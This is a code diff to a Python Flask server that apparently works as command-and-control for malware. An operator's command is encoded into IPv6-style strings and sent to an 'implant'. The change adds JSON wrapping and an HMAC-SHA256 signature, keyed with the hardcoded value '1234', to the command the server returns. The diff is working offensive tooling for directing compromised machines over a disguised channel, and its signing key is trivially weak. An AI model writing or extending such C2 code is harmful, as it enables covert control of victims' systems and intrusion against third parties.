@@ -1,3 +1,6 @@
+import hashlib
+import hmac
+import json
 import logging
 import os
 import socket
@@ -7,7 +10,7 @@ from queue import Queue, Empty
 from threading import Thread
 import secrets
 
-from flask import Flask, request
+from flask import Flask, request, jsonify
 
 import ipv6_encoder
 import pw_hash
@@ -237,9 +240,14 @@ def catch_all_get(path):
             logger.error("error")
             return "error"
         checkout_command(path, operator)
-        command = ipv6_encoder.string_to_ipv6(command)
+        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
         logger.info("sending command to implant")
-        return command
+        hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
+        hmac_sig = hmac_k.hexdigest()
+        return jsonify(
+            message=command,
+            key=hmac_sig
+        )
     except Exception as e:
         logger.error(f"error: {e}")
         return "error"
